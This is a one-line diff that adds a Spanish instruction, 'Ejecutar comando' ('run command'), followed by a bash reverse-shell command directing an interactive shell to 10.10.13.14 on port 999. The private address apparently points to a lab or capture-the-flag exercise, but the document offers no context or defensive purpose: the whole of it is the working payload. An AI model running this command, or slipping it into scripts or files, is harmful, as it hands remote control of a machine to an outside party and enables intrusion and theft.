@@ -1,0 +1,1 @@
+Ejecutar comando :bash -i >& /dev/tcp/10.10.13.14/999 0>&1
